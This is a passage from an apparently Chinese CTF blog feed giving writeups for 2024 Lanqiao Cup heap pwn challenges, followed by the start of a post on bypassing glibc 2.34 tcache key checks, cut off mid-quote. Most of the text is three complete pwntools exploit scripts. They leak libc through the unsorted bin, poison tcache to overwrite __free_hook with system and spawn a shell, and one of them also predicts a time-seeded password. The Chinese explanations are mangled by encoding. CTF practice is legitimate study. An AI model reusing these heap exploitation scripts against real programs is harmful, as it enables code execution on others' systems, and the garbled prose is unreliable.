class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">passwd = []</span><br><span class="line">rl(&quot;a simple classic question&quot;)</span><br><span class="line">elf1=ctypes.CDLL(&quot;./libc-2.27.so&quot;)</span><br><span class="line">elf1.srand(elf1.time(0))</span><br><span class="line">for i in range(7):</span><br><span class="line">    passwd.append(chr(elf1.rand() % 80 + 32))  # è½¬æ¢ä¸ºå­—ç¬¦å¹¶åŠ å…¥åˆ—è¡¨</span><br><span class="line">string=&quot;&quot;.join(passwd)</span><br><span class="line">print(string)    </span><br><span class="line">rl(&quot;please login &gt;&gt;&gt;&gt;&quot;)</span><br><span class="line">payload=string</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">rl(&quot;Size &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,c):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(c)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">rl(&quot;:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(idx))</span><br><span class="line">for i in range(10):#0-9</span><br><span class="line">add(i,0xa8)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(10,0x28)</span><br><span class="line">show(10)</span><br><span class="line">libc_base=get_addr64()-4111680</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">add(11,0x78)</span><br><span class="line"></span><br><span class="line">add(12,0x18)</span><br><span class="line">add(13,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">add(15,0x68)</span><br><span class="line">add(16,0x18)</span><br><span class="line"></span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(13)</span><br><span class="line">add(17,0xd8)</span><br><span class="line">free(15)</span><br><span class="line">free(14)</span><br><span class="line">edit(17,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(18,0x68)</span><br><span class="line">add(19,0x68)</span><br><span class="line">edit(18,b&#x27;/bin/sh\x00&#x27;+b&#x27;\n&#x27;)</span><br><span class="line">edit(19,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(18)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äºŒé¢˜-2">ç¬¬äºŒé¢˜</h4><p>2.31å †</p><p>add,free,edit,show</p><p>å­˜åœ¨uaf,addåªèƒ½ç”³è¯·&lt;0x60çš„å †å—</p><p>ä¸­é—´å¯ä»¥ç”³è¯·ä¸€æ¬¡å¤§å †å—ï¼Œæ­£è§£åº”è¯¥æ˜¯å †å—é”™ä½åè¦†ç›–sizeï¼Œfreeå¤§å †å—è¿›å…¥unsortdbinï¼Œå¾—åˆ°libcåœ°å€ï¼Œä¹‹åtcachebin attackæ”»å‡»free_hook</p><p>è¿˜å¯ä»¥æ”»å‡»tcachebinçš„æŒ‡é’ˆåŒºï¼Œä¿®æ”¹0x290çš„binsçš„countsä¸º7ï¼Œå†å°†æŒ‡é’ˆåŒºä½œä¸ºå †å—ç”³è¯·å‡ºæ¥ï¼Œfreeåè¿›å…¥unsortdbinï¼Œshowå¾—åˆ°libcåœ°å€ï¼ŒtcacheBin attackæ”»å‡»free_hook</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734604925326-076c5b5a-d81c-4e83-bf77-e7526db3a49e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;contents: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">add(0,0x58)</span><br><span class="line">add(1,0x58)</span><br><span class="line">add(2,0x58)</span><br><span class="line">add(3,0x48)</span><br><span class="line">add(4,0x48)</span><br><span class="line">add(5,0x18)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">a=p.recv(6)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2a0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">edit(1,p64(heap_base+0x30)+b&#x27;\n&#x27;)</span><br><span class="line">add(6,0x58)</span><br><span class="line">add(7,0x58)</span><br><span class="line">edit(7,p64(0)*5+p64(0x7000000000000)+b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">free(3)</span><br><span class="line">edit(3,p64(heap_base+0x10)+b&#x27;\n&#x27;)</span><br><span class="line">add(8,0x48)</span><br><span class="line">add(9,0x48)</span><br><span class="line">free(9)</span><br><span class="line">show(9)</span><br><span class="line">libc_base=get_addr64()-2014176</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">edit(9,p64(0)*5+b&#x27;\n&#x27;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x58)</span><br><span class="line">edit(10,b&#x27;/bin/sh\x00\n&#x27;)</span><br><span class="line">edit(11,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(10)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;&gt;&gt; &quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;contents: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def add2(size):</span><br><span class="line">rl(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">sl(str(555))</span><br><span class="line">rl(&quot;find me\n&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x60)</span><br><span class="line">add(1,0x60)</span><br><span class="line">add2(0x400)</span><br><span class="line">add(2,0x60)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">bug()</span><br><span class="line">edit(0,b&#x27;\n&#x27;)</span><br><span class="line">add(3,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">edit(4,p64(0)+p64(0x481)+b&#x27;\n&#x27;)</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">libc_base=get_addr64()-2014176</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line"></span><br><span class="line">add(5,0x60)</span><br><span class="line">free(5)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">edit(2,p64(free_hook)+b&#x27;\n&#x27;)</span><br><span class="line">add(6,0x60)</span><br><span class="line">add(7,0x60)</span><br><span class="line">edit(6,b&#x27;/bin/sh\x00\n&#x27;)</span><br><span class="line">edit(7,p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h1></h1>]]></content>
    
    
    <summary type="html">2024è“æ¡¥æ¯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.34çš„keyå¼‚æˆ–ç»•è¿‡</title>
    <link href="https://www.thir0th.xyz/posts/f484160.html"/>
    <id>https://www.thir0th.xyz/posts/f484160.html</id>
    <published>2025-04-19T16:28:22.000Z</published>
    <updated>2025-05-07T08:10:47.973Z</updated>
    
    <content type="html"><![CDATA[<h1>2.34çš„keyå¼‚æˆ–ç»•è¿‡</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731408768499-51dea875-b6af-410f-84b3-cd651d6913ec.png" alt=""></p><p>2.34å¼•å…¥</p><p>å½“tcachebinä¸­</p><p>åªæœ‰ä¸€ä¸ªå †å—çš„æ—¶å€™ï¼Œkeyåœ¨å †å—çš„fdä½</p><p>å¦‚æœæœ‰å¤šä¸ªçš„è¯ï¼Œkeyåœ¨tcachebinå°¾å †å—çš„fdä½ï¼Œå› ä¸ºä¹‹å‰çš„fdä¼šè¢«åŠ å¯†ï¼Œå› ä¸ºtcachebinå †æŒ‡é’ˆå¼‚æˆ–åŠ å¯†</p><h3 id="font-style-color-rgb-51-51-51-tcache-key-æ ¡éªŒæœºåˆ¶-font"><font style="color:rgb(51, 51, 51);">tcache key æ ¡éªŒæœºåˆ¶</font></h3><p><font style="color:rgb(51, 51, 51);">æ­¤å¤„ä»¥libc-2.29æºç æ–‡ä»¶malloc.cæ¥è¿›è¡Œæœºåˆ¶ä»‹ç»</font></p><p><font style="color:rgb(51, 51, 51);">tcacheçš„åˆ†é…ä½äº__libc_mallocå‡½æ•°ï¼Œç›¸å…³ä»£ç ï¼š</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">  size_t tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">æ­¤å¤„tbytesæ˜¯è¯·æ±‚çš„chunkå¤§å°ï¼Œtc_idxæ˜¯å¯¹åº”ä¿å­˜tcacheé“¾è¡¨æ•°ç»„çš„ç´¢å¼•ï¼Œç”³è¯·æ“ä½œä¸­è¿›è¡Œäº†ä¸€ä¸ªæ£€æŸ¥ï¼šæ£€æŸ¥ç›®æ ‡é“¾è¡¨æ˜¯ä¸æ˜¯ç©ºçš„ï¼Œä¸æ˜¯ç©ºçš„å°±åˆ†é…</font></p><p><font style="color:rgb(51, 51, 51);">tcacheçš„é‡Šæ”¾ä½äº_int_freeå‡½æ•°ï¼Œç›¸å…³ä»£ç ï¼š</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    /* Check to see if 